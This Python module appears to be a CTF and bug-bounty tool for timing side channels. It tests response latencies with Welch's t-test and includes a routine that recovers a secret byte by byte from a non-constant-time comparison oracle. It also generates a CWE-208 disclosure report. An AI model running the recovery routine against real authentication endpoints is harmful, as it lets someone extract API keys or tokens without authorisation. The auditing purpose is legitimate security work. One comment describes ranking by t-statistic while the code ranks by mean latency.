"""
Statistical Side-Channel Timing Oracle Engine (timing_oracle.py)
================================================================
Implements rigorous statistical hypothesis testing for detecting and exploiting
non-constant-time comparisons (e.g. string equality == instead of constant-time
hmac.compare_digest in authentication, HMAC verification, and cryptographic tokens).
  - Welch's Two-Sample t-test over response latency distributions.
  - Automated byte-by-byte secret recovery with sample-averaging and outlier filtering.
  - Generates 10-point Bug Bounty Disclosure Report (CWE-208 / CVSS:3.1).
"""

import math
import time
from typing import Dict, Any, List, Tuple, Callable, Optional


def welch_t_test(sample_a: List[float], sample_b: List[float]) -> Tuple[float, float]:
    """
    Computes Welch's t-statistic and degrees of freedom for two samples
    with unequal variances and potentially unequal sample sizes.
    """
    n_a = len(sample_a)
    n_b = len(sample_b)
    if n_a < 2 or n_b < 2:
        return 0.0, 1.0

    mean_a = sum(sample_a) / n_a
    mean_b = sum(sample_b) / n_b

    var_a = sum((x - mean_a) ** 2 for x in sample_a) / (n_a - 1)
    var_b = sum((x - mean_b) ** 2 for x in sample_b) / (n_b - 1)

    denom = math.sqrt(var_a / n_a + var_b / n_b)
    if denom == 0:
        return 0.0, float(n_a + n_b - 2)

    t_stat = (mean_a - mean_b) / denom

    # Welch-Satterthwaite equation for degrees of freedom
    num_df = (var_a / n_a + var_b / n_b) ** 2
    den_df = ((var_a / n_a) ** 2 / (n_a - 1)) + ((var_b / n_b) ** 2 / (n_b - 1))
    df = num_df / den_df if den_df > 0 else 1.0

    return t_stat, df


def filter_outliers(samples: List[float], iqr_multiplier: float = 1.5) -> List[float]:
    """Filters transient CPU/network latency spikes using interquartile range (IQR)."""
    if len(samples) < 4:
        return samples
    sorted_s = sorted(samples)
    q1 = sorted_s[len(sorted_s) // 4]
    q3 = sorted_s[(3 * len(sorted_s)) // 4]
    iqr = q3 - q1
    lower = q1 - iqr_multiplier * iqr
    upper = q3 + iqr_multiplier * iqr
    filtered = [x for x in samples if lower <= x <= upper]
    return filtered if filtered else samples


class TimingOracleSolver:
    """
    Recovers secrets character-by-character from timing oracles.
    """

    @classmethod
    def recover_next_byte(
        cls,
        oracle_func: Callable[[str], bool],
        known_prefix: str,
        charset: str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}",
        samples_per_candidate: int = 15
    ) -> Tuple[str, Dict[str, Any]]:
        """
        Tests each character in charset, records latencies, and identifies
        the candidate that produces a statistically significant timing discrepancy.
        """
        timings: Dict[str, List[float]] = {}

        # 1. Measure baseline latency with a dummy candidate
        baseline_samples: List[float] = []
        dummy_str = known_prefix + "\x00"
        for _ in range(samples_per_candidate):
            t0 = time.perf_counter()
            oracle_func(dummy_str)
            baseline_samples.append((time.perf_counter() - t0) * 1000)
        baseline_clean = filter_outliers(baseline_samples)
        base_mean = sum(baseline_clean) / len(baseline_clean) if baseline_clean else 0

        # 2. Measure candidate latencies
        candidate_stats: List[Dict[str, Any]] = []
        for char in charset:
            test_str = known_prefix + char
            samples: List[float] = []
            for _ in range(samples_per_candidate):
                t0 = time.perf_counter()
                oracle_func(test_str)
                samples.append((time.perf_counter() - t0) * 1000)

            clean = filter_outliers(samples)
            c_mean = sum(clean) / len(clean) if clean else 0
            t_stat, _ = welch_t_test(clean, baseline_clean)

            candidate_stats.append({
                "char": char,
                "mean_ms": round(c_mean, 3),
                "diff_ms": round(c_mean - base_mean, 3),
                "t_stat": round(t_stat, 2)
            })

        # Sort candidate by highest latency / highest t-statistic
        candidate_stats.sort(key=lambda x: x["mean_ms"], reverse=True)
        best = candidate_stats[0]

        return best["char"], {
            "best_char": best["char"],
            "best_mean_ms": best["mean_ms"],
            "t_statistic": best["t_stat"],
            "top_candidates": candidate_stats[:5]
        }

    @classmethod
    def audit_timing_leakage(
        cls,
        oracle_func: Callable[[str], bool],
        sample_size: int = 20,
        endpoint_url: str = "https://target.com/api/verify"
    ) -> Dict[str, Any]:
        """
        Determines whether an oracle exhibits observable timing discrepancies
        and generates a 10-point Bug Bounty vulnerability report if confirmed.
        """
        correct_guess_samples: List[float] = []
        wrong_guess_samples: List[float] = []

        # Run test comparing matching prefix vs non-matching prefix
        for _ in range(sample_size):
            t0 = time.perf_counter()
            oracle_func("A")
            wrong_guess_samples.append((time.perf_counter() - t0) * 1000)

            t0 = time.perf_counter()
            oracle_func("flag{")
            correct_guess_samples.append((time.perf_counter() - t0) * 1000)

        clean_wrong = filter_outliers(wrong_guess_samples)
        clean_correct = filter_outliers(correct_guess_samples)

        mean_wrong = sum(clean_wrong) / len(clean_wrong) if clean_wrong else 0
        mean_correct = sum(clean_correct) / len(clean_correct) if clean_correct else 0
        diff_ms = abs(mean_correct - mean_wrong)
        t_stat, df = welch_t_test(clean_correct, clean_wrong)

        is_leaking = abs(t_stat) >= 2.5 and diff_ms >= 0.05

        findings = []
        if is_leaking:
            findings.append({
                "type": "TIMING_SIDE_CHANNEL_LEAK",
                "severity": "HIGH",
                "cwe": "CWE-208",
                "title": "Observable Timing Discrepancy (Side-Channel Information Leak)",
                "description": f"The endpoint exhibits non-constant time comparison behavior (Welch's t={t_stat:.2f}, delta={diff_ms:.2f}ms). String comparison aborts early upon character mismatch, allowing byte-by-byte secret extraction."
            })

        report_md = ""
        if findings:
            from bug_bounty_crypto import BugBountyReportGenerator
            rep_dict = BugBountyReportGenerator.generate_report(
                title="Observable Timing Discrepancy (CWE-208)",
                affected_asset=endpoint_url,
                finding_type="TIMING_SIDE_CHANNEL_LEAK",
                root_cause=f"Early-exit string comparison detected (t-statistic: {t_stat:.2f}, latency delta: {diff_ms:.2f}ms).",
                reproduction_steps=[
                    "Issue multiple requests with varied token prefixes.",
                    "Record high-resolution response latencies.",
                    f"Perform Welch's two-sample t-test (observed t={t_stat:.2f})."
                ],
                evidence=f"Mean Latency (Matching Prefix): {mean_correct:.3f} ms\nMean Latency (Mismatched Prefix): {mean_wrong:.3f} ms\nDifference: {diff_ms:.3f} ms (Welch t-stat: {t_stat:.2f})",
                impact="An attacker can iteratively deduce secrets, API keys, or password hashes byte-by-byte by observing response time differentials.",
                suggested_fix="Replace variable-time comparisons (== or !=) with constant-time equality checks using hmac.compare_digest(a, b) in Python or equivalent constant-time crypto primitives."
            )
            report_md = rep_dict["markdown"]

        return {
            "timing_leak_detected": is_leaking,
            "mean_correct_ms": round(mean_correct, 3),
            "mean_wrong_ms": round(mean_wrong, 3),
            "latency_delta_ms": round(diff_ms, 3),
            "welch_t_statistic": round(t_stat, 2),
            "findings": findings,
            "bug_bounty_report": report_md
        }
